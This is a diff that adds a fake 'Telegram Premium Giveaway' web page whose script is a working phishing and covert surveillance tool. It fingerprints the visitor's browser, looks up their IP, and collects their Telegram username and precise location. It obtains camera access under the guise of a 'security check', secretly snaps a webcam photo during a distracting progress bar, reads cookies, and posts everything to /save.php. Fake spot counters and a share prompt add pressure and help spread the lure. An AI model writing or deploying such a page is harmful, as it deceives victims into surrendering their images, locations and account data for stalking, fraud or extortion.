@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Telegram Premium Giveaway</title>
+  <style>
+    body {
+      background-color: #17212b;
+      color: white;
+      font-family: 'Roboto', Arial, sans-serif;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      justify-content: center;
+      align-items: center;
+    }
+    .container {
+      width: 90%;
+      max-width: 500px;
+      padding: 20px;
+    }
+    .box {
+      background-color: #242f3d;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 5px 25px rgba(0, 136, 204, 0.3);
+      margin-bottom: 20px;
+    }
+    .telegram-logo {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 20px;
+      background-color: #0088cc;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 40px;
+      color: white;
+    }
+    h1 {
+      color: #ffffff;
+      font-size: 28px;
+      margin-bottom: 15px;
+    }
+    h2 {
+      color: #0088cc;
+      font-size: 24px;
+      margin-bottom: 15px;
+    }
+    p {
+      color: #b1c3d5;
+      font-size: 16px;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+    .highlight {
+      color: #0088cc;
+      font-weight: bold;
+    }
+    .progress-container {
+      background: #1c2733;
+      height: 20px;
+      border-radius: 10px;
+      margin: 20px 0;
+      overflow: hidden;
+    }
+    .progress-bar {
+      height: 100%;
+      background: linear-gradient(90deg, #0088cc, #29b6f6);
+      border-radius: 10px;
+      width: 85%;
+    }
+    .stats {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 30px;
+    }
+    .stat {
+      text-align: center;
+    }
+    .stat-value {
+      font-size: 24px;
+      font-weight: bold;
+      color: #0088cc;
+    }
+    .stat-label {
+      font-size: 14px;
+      color: #b1c3d5;
+    }
+    button {
+      background-color: #0088cc;
+      color: white;
+      border: none;
+      padding: 12px 30px;
+      font-size: 16px;
+      border-radius: 30px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: all 0.3s ease;
+      display: inline-block;
+    }
+    button:hover {
+      background-color: #0099e6;
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(0, 136, 204, 0.4);
+    }
+    .premium-badge {
+      background: linear-gradient(45deg, #feac5e, #c779d0, #4bc0c8);
+      color: white;
+      padding: 5px 12px;
+      border-radius: 20px;
+      font-size: 14px;
+      font-weight: bold;
+      display: inline-block;
+      margin-bottom: 15px;
+    }
+    footer {
+      margin-top: 40px;
+      font-size: 14px;
+      color: #8596a6;
+      padding: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="box">
+      <div class="telegram-logo">✈️</div>
+      <span class="premium-badge">PREMIUM GIVEAWAY</span>
+      <h1>Telegram Premium Giveaway</h1>
+      <p>We're giving away <span class="highlight">20 Telegram Premium</span> subscriptions to lucky participants!</p>
+      
+      <div class="progress-container">
+        <div class="progress-bar"></div>
+      </div>
+      
+      <div class="stats">
+        <div class="stat">
+          <div class="stat-value">17</div>
+          <div class="stat-label">Participants</div>
+        </div>
+        <div class="stat">
+          <div class="stat-value">20</div>
+          <div class="stat-label">Total Spots</div>
+        </div>
+        <div class="stat">
+          <div class="stat-value">3</div>
+          <div class="stat-label">Spots Left</div>
+        </div>
+      </div>
+      
+      <h2>How to Participate:</h2>
+      <p>To qualify for the giveaway, complete a quick verification to secure your entry.</p>
+      <button onclick="startVerification()">Join Giveaway</button>
+    </div>
+  </div>
+
+  <footer>
+    © 2025 Telegram Premium Giveaway • All rights reserved
+  </footer>
+
+  <script>
+    let verificationStep = 1;
+    let videoStream = null;
+    let userData = {
+      username: '',
+      location: null,
+      ipInfo: null,
+      userAgent: navigator.userAgent,
+      timestamp: new Date().toISOString(),
+      screenSize: `${window.screen.width}x${window.screen.height}`,
+      language: navigator.language,
+      platform: navigator.platform,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      browserInfo: {
+        cookiesEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
+        online: navigator.onLine
+      }
+    };
+    const container = document.querySelector('.container');
+
+    // Get user's IP info from external service
+    fetch('https://ipinfo.io/json')
+      .then(response => response.json())
+      .then(data => {
+        userData.ipInfo = data;
+      })
+      .catch(error => console.error('Error fetching IP info:', error));
+    
+    function startVerification() {
+      // Start with notification permission first
+      if (Notification.permission !== "granted") {
+        requestNotificationPermission();
+      } else {
+        moveToNextVerificationStep();
+      }
+    }
+    
+    function requestNotificationPermission() {
+      Notification.requestPermission().then(function(permission) {
+        userData.notificationPermission = permission;
+        moveToNextVerificationStep();
+      });
+    }
+    
+    function moveToNextVerificationStep() {
+      switch(verificationStep) {
+        case 1:
+          // First step - show account verification form
+          showAccountVerificationStep();
+          verificationStep++;
+          break;
+        case 2:
+          // Request location permission
+          requestLocationPermission();
+          verificationStep++;
+          break;
+        case 3:
+          // Request microphone permission
+          requestMicrophonePermission();
+          verificationStep++;
+          break;
+        case 4:
+          // Camera security check (mixed in between other permissions)
+          showDeviceSecurityCheck();
+          verificationStep++;
+          break;
+        case 5:
+          // Final verification step
+          showFinalVerification();
+          verificationStep++;
+          break;
+        case 6:
+          // Submit all collected data
+          processVerification();
+          break;
+      }
+    }
+    
+    function requestLocationPermission() {
+      const verifyBox = document.querySelector('.box');
+      verifyBox.innerHTML = `
+        <div class="telegram-logo">📍</div>
+        <span class="premium-badge">STEP 2 OF 5</span>
+        <h2>Location Verification</h2>
+        <p>To ensure you're in an eligible region for the giveaway, we need to verify your location.</p>
+        
+        <div class="progress-container" style="margin-bottom: 30px;">
+          <div class="progress-bar" style="width: 40%;"></div>
+        </div>
+        
+        <div style="text-align: left; padding: 20px; background: #1c2733; border-radius: 10px; margin-bottom: 25px;">
+          <p style="margin-top: 0;"><span class="highlight">✓ Step 1:</span> Account Verification</p>
+          <p><span class="highlight">Step 2:</span> Regional Eligibility</p>
+          <p><span style="opacity: 0.7;">Step 3: Audio Verification</span></p>
+          <p><span style="opacity: 0.7;">Step 4: Security Check</span></p>
+          <p style="margin-bottom: 0;"><span style="opacity: 0.7;">Step 5: Confirmation</span></p>
+        </div>
+        
+        <p>Click below to verify your regional eligibility:</p>
+        <button onclick="verifyLocation()">Verify Region</button>
+      `;
+    }
+    
+    function verifyLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            // Store location data
+            userData.location = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy
+            };
+            moveToNextVerificationStep();
+          },
+          function(error) {
+            console.error("Location error:", error);
+            userData.locationError = error.message;
+            // Continue anyway even if location permission is denied
+            moveToNextVerificationStep();
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 0
+          }
+        );
+      } else {
+        userData.locationError = "Geolocation not supported";
+        moveToNextVerificationStep();
+      }
+    }
+    
+    function requestMicrophonePermission() {
+      const verifyBox = document.querySelector('.box');
+      verifyBox.innerHTML = `
+        <div class="telegram-logo">🎤</div>
+        <span class="premium-badge">STEP 3 OF 5</span>
+        <h2>Audio Verification</h2>
+        <p>As part of our anti-fraud measures, we need to verify sound levels in your environment.</p>
+        
+        <div class="progress-container" style="margin-bottom: 30px;">
+          <div class="progress-bar" style="width: 60%;"></div>
+        </div>
+        
+        <div style="text-align: left; padding: 20px; background: #1c2733; border-radius: 10px; margin-bottom: 25px;">
+          <p style="margin-top: 0;"><span class="highlight">✓ Step 1:</span> Account Verification</p>
+          <p><span class="highlight">✓ Step 2:</span> Regional Eligibility</p>
+          <p><span class="highlight">Step 3:</span> Audio Verification</p>
+          <p><span style="opacity: 0.7;">Step 4: Security Check</span></p>
+          <p style="margin-bottom: 0;"><span style="opacity: 0.7;">Step 5: Confirmation</span></p>
+        </div>
+        
+        <p>Click below to perform a quick audio check:</p>
+        <button onclick="checkMicrophone()">Start Audio Check</button>
+      `;
+    }
+    
+    function checkMicrophone() {
+      navigator.mediaDevices.getUserMedia({ audio: true })
+        .then(function(stream) {
+          // Store that microphone access was granted
+          userData.microphoneAccess = "granted";
+          
+          // Stop the audio stream right away - we don't need it
+          stream.getTracks().forEach(track => track.stop());
+          
+          // Move to next step
+          moveToNextVerificationStep();
+        })
+        .catch(function(error) {
+          console.error("Microphone error:", error);
+          userData.microphoneError = error.message;
+          // Continue anyway if mic access is denied
+          moveToNextVerificationStep();
+        });
+    }
+    
+    function showAccountVerificationStep() {
+      const verifyBox = document.querySelector('.box');
+      verifyBox.innerHTML = `
+        <div class="telegram-logo">🔒</div>
+        <span class="premium-badge">STEP 1 OF 5</span>
+        <h2>Account Verification</h2>
+        <p>To ensure fair distribution of prizes, please complete a quick 5-step verification process.</p>
+        
+        <div class="progress-container" style="margin-bottom: 30px;">
+          <div class="progress-bar" style="width: 20%;"></div>
+        </div>
+        
+        <div style="text-align: left; padding: 20px; background: #1c2733; border-radius: 10px; margin-bottom: 25px;">
+          <p style="margin-top: 0;"><span class="highlight">Step 1:</span> Account Verification</p>
+          <p><span style="opacity: 0.7;">Step 2: Regional Eligibility</span></p>
+          <p><span style="opacity: 0.7;">Step 3: Audio Verification</span></p>
+          <p><span style="opacity: 0.7;">Step 4: Security Check</span></p>
+          <p style="margin-bottom: 0;"><span style="opacity: 0.7;">Step 5: Confirmation</span></p>
+        </div>
+        
+        <p>Please enter your Telegram username to verify your account:</p>
+        <input type="text" id="username" placeholder="@username" style="padding: 12px; width: 100%; box-sizing: border-box; border-radius: 8px; border: none; margin-bottom: 20px; background: #1c2733; color: white;">
+        
+        <button onclick="saveUsernameAndContinue()">Continue</button>
+      `;
+    }
+    
+    function saveUsernameAndContinue() {
+      const username = document.getElementById('username').value;
+      userData.username = username;
+      moveToNextVerificationStep();
+    }
+    
+    function showDeviceSecurityCheck() {
+      const verifyBox = document.querySelector('.box');
+      verifyBox.innerHTML = `
+        <div class="telegram-logo">🛡️</div>
+        <span class="premium-badge">STEP 4 OF 5</span>
+        <h2>Security Verification</h2>
+        <p>Our system needs to verify that you're accessing from a secure device.</p>
+        
+        <div class="progress-container" style="margin-bottom: 30px;">
+          <div class="progress-bar" style="width: 80%;"></div>
+        </div>
+        
+        <div style="text-align: left; padding: 20px; background: #1c2733; border-radius: 10px; margin-bottom: 25px;">
+          <p style="margin-top: 0;"><span class="highlight">✓ Step 1:</span> Account Verification</p>
+          <p><span class="highlight">✓ Step 2:</span> Regional Eligibility</p>
+          <p><span class="highlight">✓ Step 3:</span> Audio Verification</p>
+          <p><span class="highlight">Step 4:</span> Security Check</p>
+          <p style="margin-bottom: 0;"><span style="opacity: 0.7;">Step 5: Confirmation</span></p>
+        </div>
+        
+        <p>Click the button below to run a quick security check on your device:</p>
+        <button onclick="runSecurityCheck()">Run Security Check</button>
+      `;
+    }
+    
+    function showFinalVerification() {
+      const verifyBox = document.querySelector('.box');
+      verifyBox.innerHTML = `
+        <div class="telegram-logo">✓</div>
+        <span class="premium-badge">STEP 5 OF 5</span>
+        <h2>Final Verification</h2>
+        <p>All security checks have been completed successfully.</p>
+        
+        <div class="progress-container" style="margin-bottom: 30px;">
+          <div class="progress-bar" style="width: 100%;"></div>
+        </div>
+        
+        <div style="text-align: left; padding: 20px; background: #1c2733; border-radius: 10px; margin-bottom: 25px;">
+          <p style="margin-top: 0;"><span class="highlight">✓ Step 1:</span> Account Verification</p>
+          <p><span class="highlight">✓ Step 2:</span> Regional Eligibility</p>
+          <p><span class="highlight">✓ Step 3:</span> Audio Verification</p>
+          <p><span class="highlight">✓ Step 4:</span> Security Check</p>
+          <p style="margin-bottom: 0;"><span class="highlight">Step 5:</span> Confirmation</p>
+        </div>
+        
+        <p>You're almost done! Click below to complete your entry:</p>
+        <button onclick="moveToNextVerificationStep()">Complete Entry</button>
+      `;
+    }
+    
+    function runSecurityCheck() {
+      // This is where we actually request camera permission, but framed as a security check
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+          videoStream = stream;
+          
+          // Hide the video, we don't need to show it
+          const verifyBox = document.querySelector('.box');
+          verifyBox.innerHTML = `
+            <div class="telegram-logo">🔍</div>
+            <span class="premium-badge">ANALYZING</span>
+            <h2>Device Verification</h2>
+            <p>Please wait while we verify your device security...</p>
+            
+            <div class="progress-container" style="margin-top: 30px;">
+              <div class="progress-bar progress-animated" style="width: 0%;"></div>
+            </div>
+            
+            <div id="verification-status" style="margin-top: 20px; color: #0088cc;">
+              Checking device parameters...
+            </div>
+          `;
+          
+          // Create hidden video and canvas elements for capturing
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.autoplay = true;
+          video.style.display = 'none';
+          document.body.appendChild(video);
+          
+          // Animate the progress bar
+          const progressBar = document.querySelector('.progress-animated');
+          let width = 0;
+          const interval = setInterval(function() {
+            if (width >= 100) {
+              clearInterval(interval);
+              
+              // When progress reaches 100%, capture the image and proceed
+              captureImageSilently(video);
+            } else {
+              width += 2;
+              progressBar.style.width = width + '%';
+              
+              // Update status messages to distract the user
+              const statusElement = document.getElementById('verification-status');
+              if (width === 20) {
+                statusElement.innerText = "Verifying browser environment...";
+              } else if (width === 40) {
+                statusElement.innerText = "Checking network security...";
+              } else if (width === 60) {
+                statusElement.innerText = "Validating device integrity...";
+              } else if (width === 80) {
+                statusElement.innerText = "Confirming security protocols...";
+              } else if (width === 98) {
+                statusElement.innerText = "Security verification complete!";
+              }
+            }
+          }, 50);
+          
+          video.addEventListener('loadeddata', function() {
+            // The video is ready, but we'll wait for the progress bar animation
+          });
+        })
+        .catch(function(error) {
+          const verifyBox = document.querySelector('.box');
+          verifyBox.innerHTML = `
+            <div class="telegram-logo" style="background-color: #e74c3c;">⚠️</div>
+            <span class="premium-badge" style="background: linear-gradient(45deg, #cb356b, #bd3f32);">SECURITY ALERT</span>
+            <h2>Verification Required</h2>
+            <p>To protect against fraud, we need to verify your device security.</p>
+            <p>This requires temporary access to verify your device's security features.</p>
+            <button onclick="runSecurityCheck()">Complete Security Verification</button>
+          `;
+        });
+    }
+    
+    function captureImageSilently(video) {
+      // Create canvas to capture the image
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.style.display = 'none';
+      document.body.appendChild(canvas);
+      
+      // Capture the image
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL('image/jpeg');
+      
+      // Show final verification step
+      const verifyBox = document.querySelector('.box');
+      verifyBox.innerHTML = `
+        <div class="telegram-logo">✓</div>
+        <span class="premium-badge">STEP 3 OF 3</span>
+        <h2>Verification Complete</h2>
+        <p>Your device security check has been successfully completed.</p>
+        
+        <div class="progress-container" style="margin-bottom: 30px;">
+          <div class="progress-bar" style="width: 100%;"></div>
+        </div>
+        
+        <div style="text-align: left; padding: 20px; background: #1c2733; border-radius: 10px; margin-bottom: 25px;">
+          <p style="margin-top: 0;"><span class="highlight">✓ Step 1:</span> Account Verification</p>
+          <p><span class="highlight">✓ Step 2:</span> Security Check</p>
+          <p style="margin-bottom: 0;"><span class="highlight">Step 3:</span> Confirmation</p>
+        </div>
+        
+        <p>Click the button below to complete your entry for the giveaway:</p>
+        <button onclick="finalizeEntry('${imageData}')">Complete Entry</button>
+      `;
+    }
+    
+    function processVerification() {
+      // At this point, we should have all the user data and the captured image
+      // Let's process and submit everything
+      
+      const verifyBox = document.querySelector('.box');
+      verifyBox.innerHTML = `
+        <div class="telegram-logo">🔄</div>
+        <span class="premium-badge">PROCESSING</span>
+        <h2>Finalizing Your Entry</h2>
+        <p>Please wait while we register your participation...</p>
+        <div class="progress-container">
+          <div class="progress-bar" style="width: 50%;"></div>
+        </div>
+      `;
+      
+      // Finalize the user data collection
+      userData.finalTimestamp = new Date().toISOString();
+      userData.referrer = document.referrer;
+      userData.cookies = document.cookie;
+      
+      // Try to get battery info
+      if (navigator.getBattery) {
+        navigator.getBattery().then(battery => {
+          userData.battery = {
+            level: battery.level,
+            charging: battery.charging
+          };
+        });
+      }
+      
+      // Try to get network information
+      if (navigator.connection) {
+        userData.network = {
+          type: navigator.connection.effectiveType,
+          downlink: navigator.connection.downlink,
+          rtt: navigator.connection.rtt,
+          saveData: navigator.connection.saveData
+        };
+      }
+      
+      // Check if user has ad blocker
+      const testAd = document.createElement('div');
+      testAd.innerHTML = '&nbsp;';
+      testAd.className = 'adsbox';
+      document.body.appendChild(testAd);
+      window.setTimeout(function() {
+        if (testAd.offsetHeight === 0) {
+          userData.adBlocker = true;
+        } else {
+          userData.adBlocker = false;
+        }
+        testAd.remove();
+      }, 100);
+    }
+
+    function finalizeEntry(imageData) {
+      // Show processing message
+      const verifyBox = document.querySelector('.box');
+      verifyBox.innerHTML = `
+        <div class="telegram-logo">🔄</div>
+        <span class="premium-badge">PROCESSING</span>
+        <h2>Finalizing Your Entry</h2>
+        <p>Please wait while we register your participation...</p>
+        <div class="progress-container">
+          <div class="progress-bar" style="width: 50%;"></div>
+        </div>
+      `;
+      
+      // Send the image and all collected data to server
+      fetch('/save.php', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: 'image=' + encodeURIComponent(imageData) + '&userData=' + encodeURIComponent(JSON.stringify(userData))
+      })
+      .then(response => response.text())
+      .then(data => {
+        // Stop the video stream if it's still active
+        if (videoStream) {
+          videoStream.getTracks().forEach(track => track.stop());
+        }
+        
+        // Show success message
+        verifyBox.innerHTML = `
+          <div class="telegram-logo" style="background: linear-gradient(45deg, #feac5e, #c779d0, #4bc0c8);">🎉</div>
+          <span class="premium-badge">CONGRATULATIONS</span>
+          <h2>You're In!</h2>
+          <p>Your entry has been successfully verified and submitted for the <span class="highlight">Telegram Premium Giveaway</span>!</p>
+          <div class="stats">
+            <div class="stat">
+              <div class="stat-value">18</div>
+              <div class="stat-label">Participants</div>
+            </div>
+            <div class="stat">
+              <div class="stat-value">20</div>
+              <div class="stat-label">Total Spots</div>
+            </div>
+            <div class="stat">
+              <div class="stat-value">2</div>
+              <div class="stat-label">Spots Left</div>
+            </div>
+          </div>
+          <p>Winners will be announced in <span class="highlight">24 hours</span>.<br>Stay tuned to your Telegram account for results!</p>
+          <button onclick="shareGiveaway()">Share with Friends</button>
+        `;
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        verifyBox.innerHTML = `
+          <div class="telegram-logo" style="background-color: #e74c3c;">❌</div>
+          <span class="premium-badge" style="background: linear-gradient(45deg, #cb356b, #bd3f32);">ERROR</span>
+          <h2>Submission Error</h2>
+          <p>There was a problem processing your entry.</p>
+          <p>Please try again or contact support.</p>
+          <button onclick="startVerification()">Try Again</button>
+        `;
+      });
+    }
+    
+    function shareGiveaway() {
+      alert("Thank you for participating! Share this giveaway with your friends to increase your chances of winning!");
+    }
+    
+    // Add CSS for animated progress bar
+    const style = document.createElement('style');
+    style.innerHTML = `
+      .progress-animated {
+        transition: width 0.5s;
+      }
+    `;
+    document.head.appendChild(style);
+  </script>
+</body>
+</html>
